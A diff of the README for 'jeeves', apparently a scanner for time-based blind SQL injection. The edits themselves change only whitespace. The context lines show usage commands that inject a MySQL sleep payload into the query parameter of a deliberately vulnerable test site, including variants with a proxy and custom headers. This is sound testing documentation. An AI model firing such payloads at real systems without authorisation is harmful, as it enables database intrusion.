@@ -49,15 +49,17 @@ echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)fro
 echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(10)))v)" | jeeves -t 10
 ```
 <br>
+
 In --payload-time you must use the time mentioned in payload
+
 <br>
 
 
 ### From list 
 
 ```cat targets | jeeves --payload-time 5```
-  
-    <br>
+ 
+<br>
     
 ### Adding Headers
 
@@ -76,6 +78,7 @@ echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)fro
 <br>
 
 Proxy + Headers =>
+
 ```bash
 echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://ip:port" -H "User-Agent: xxxx"
 ```
@@ -107,6 +110,7 @@ You are able to use of Jeeves with other tools, such as gau, gauplus, waybackurl
  -d, --data           Sending Post request with data
  -h                   Show This Help Message
 ```  
+
 <br> 
 
 Using with sql payloads wordlist
